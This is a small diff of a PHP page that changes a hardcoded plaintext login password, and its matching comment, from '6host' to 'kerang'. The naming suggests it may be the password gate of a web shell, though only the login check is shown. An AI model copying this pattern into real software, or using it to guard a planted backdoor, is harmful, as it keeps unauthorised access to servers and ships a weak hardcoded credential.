@@ -8,7 +8,7 @@ if (isset($_GET['logout'])) {
 }
 
 if (!isset($_SESSION['gits_login'])) {
-    if (isset($_POST['pass']) && $_POST['pass'] === '6host') { // default : 6host
+    if (isset($_POST['pass']) && $_POST['pass'] === 'kerang') { // default : kerang
         $_SESSION['gits_login'] = true;
         header("Location: ?");
         exit;
